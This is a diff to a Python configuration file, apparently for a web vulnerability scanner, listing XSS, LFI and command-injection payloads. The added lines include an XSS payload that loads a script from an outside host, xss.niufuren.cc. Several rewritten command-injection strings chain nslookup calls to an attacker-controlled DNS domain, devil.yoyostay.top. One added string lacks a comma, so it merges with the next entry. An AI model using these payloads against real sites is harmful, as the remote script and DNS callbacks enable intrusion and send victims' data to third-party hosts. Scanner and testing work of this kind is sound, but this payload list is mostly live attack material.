@@ -7,6 +7,7 @@ from sqlalchemy.orm import scoped_session
 from sqlalchemy.orm import sessionmaker
 from sqlalchemy.ext.declarative import declarative_base
 import sys
+import pymysql
 
 
 reload(sys)
@@ -109,6 +110,7 @@ XSS_Rule = {
         "<svg onload=alert(1)>",
         "\" onfous=alert(1)\"><\"", # 事件
         "<video><source onerror=\"alert(1)\">", # H5 payload
+        "</textarea>'\"});<script src=http://xss.niufuren.cc/QHDPCg?1526457930></script>"
     ],
 }
 
@@ -148,9 +150,9 @@ LFI_Rule = {
 
 command_injection_payloads = [
     ";nslookup ci_{domain}.devil.yoyostay.top",
-    "&nslookup ci_{domain}.devil.yoyostay.top",
-    "|nslookup ci_{domain}.devil.yoyostay.top",
-    "||nslookup ci_{domain}.devil.yoyostay.top",
+    '&nslookup ci_{domain}.devil.yoyostay.top&\'\\"`0&nslookup ci_{domain}.devil.yoyostay.top&`\'',
+    "nslookup ci_{domain}.devil.yoyostay.top|nslookup ci_{domain}.devil.yoyostay.top&nslookup ci_{domain}.devil.yoyostay.top",
+    ";nslookup ci_{domain}.devil.yoyostay.top|nslookup ci_{domain}.devil.yoyostay.top&nslookup ci_{domain}.devil.yoyostay.top;"
     "$(nslookup ci_{domain}.devil.yoyostay.top)",
     "';nslookup ci_{domain}.devil.yoyostay.top'",
     "'&nslookup ci_{domain}.devil.yoyostay.top'",
